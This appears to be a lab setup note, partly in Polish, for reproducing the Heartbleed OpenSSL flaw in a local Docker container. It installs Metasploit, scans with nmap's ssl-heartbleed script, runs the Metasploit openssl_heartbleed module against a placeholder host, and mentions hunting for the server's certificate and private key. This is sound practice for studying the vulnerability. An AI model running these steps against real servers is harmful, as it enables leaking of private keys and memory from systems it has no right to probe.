
sudo apt-get update
sudo apt-get install -y python2-dev docker.io metasploit-framework


Pip 2 install:
    curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output /tmp/get-pip.py
    sudo python2 /tmp/get-pip.py
    pip install --upgrade setuptools
    pip install gmpy pyasn1
    

Build and run:
  
    docker pull docker.io/andrewmichaelsmith/docker-heartbleed
    sudo docker run -it -p 127.0.0.1:443:443 andrewmichaelsmith/docker-heartbleed bash
    apache2ctl -D FOREGROUND
    https://127.0.0.1:443

	sudo nmap -p 443 --script ssl-heartbleed 127.0.0.1

New Bash in docker:
    sudo docker ps -a 
    sudo docker exec -it <id> /bin/bash
    
Podejrzyj wersje openssl
Poszukaj certyfikatu oraz priv key
    openssl version -a
  




Put Data:
    ./stimulate_server.py -a 127.0.0.1:443


Metasploit:
    sudo msfdb init && msfconsole
    use auxiliary/scanner/ssl/openssl_heartbleed
    set VERBOSE true
    set RHOSTS <ip>
    exploit


./heartbleed.py -h
   








